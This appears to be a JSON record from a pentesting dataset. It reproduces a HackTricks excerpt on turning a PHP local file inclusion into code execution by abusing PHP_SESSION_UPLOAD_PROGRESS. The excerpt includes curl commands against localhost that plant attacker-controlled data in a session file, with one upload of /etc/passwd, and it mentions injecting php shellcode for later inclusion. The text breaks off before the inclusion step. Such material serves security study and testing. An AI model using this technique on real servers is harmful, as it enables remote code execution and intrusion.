{
  "id": "pentesting_web_d41489d708d9",
  "category": "pentesting-web",
  "title": "via php session upload progress",
  "description": "# LFI2RCE via PHP_SESSION_UPLOAD_PROGRESS\n\n{{#include ../../banners/hacktricks-training.md}}\n\n## Basic Info\n\nIf you found a **Local File Inclusion** even if you **don't have a session** and `session.auto_start` is `Off`. If **`session.upload_progress.enabled`** is **`On`** and you provide the **`PHP_SESSION_UPLOAD_PROGRESS`** in **multipart POST** data, PHP will **enable the session for you**.\n\n```bash\n$ curl http://127.0.0.1/ -H 'Cookie: PHPSESSID=iamorange'\n$ ls -a /var/lib/php/sessions/\n. ..\n",
  "payloads": [
    "# LFI2RCE via PHP_SESSION_UPLOAD_PROGRESS",
    "{{#include ../../banners/hacktricks-training.md}}",
    "## Basic Info",
    "If you found a **Local File Inclusion** even if you **don't have a session** and `session.auto_start` is `Off`. If **`session.upload_progress.enabled`** is **`On`** and you provide the **`PHP_SESSION_UPLOAD_PROGRESS`** in **multipart POST** data, PHP will **enable the session for you**.",
    "```bash",
    "$ curl http://127.0.0.1/ -H 'Cookie: PHPSESSID=iamorange'",
    "$ ls -a /var/lib/php/sessions/",
    "$ curl http://127.0.0.1/ -H 'Cookie: PHPSESSID=iamorange' -d 'PHP_SESSION_UPLOAD_PROGRESS=blahblahblah'",
    "$ ls -a /var/lib/php/sessions/",
    "$ curl http://127.0.0.1/ -H 'Cookie: PHPSESSID=iamorange' -F 'PHP_SESSION_UPLOAD_PROGRESS=blahblahblah'  -F 'file=@/etc/passwd'",
    "$ ls -a /var/lib/php/sessions/",
    ". .. sess_iamorange",
    "In the last example the session will contain the string blahblahblah",
    "Note that with **`PHP_SESSION_UPLOAD_PROGRESS`** you can **control data inside the session**, so if you includes your session file you can include a part you control (a php shellcode for example).",
    "> [!TIP]"
  ],
  "source": "HackTricks",
  "references": [
    "/workspaces/hunter-skill/hacktricks/src/pentesting-web/file-inclusion/via-php_session_upload_progress.md"
  ]
}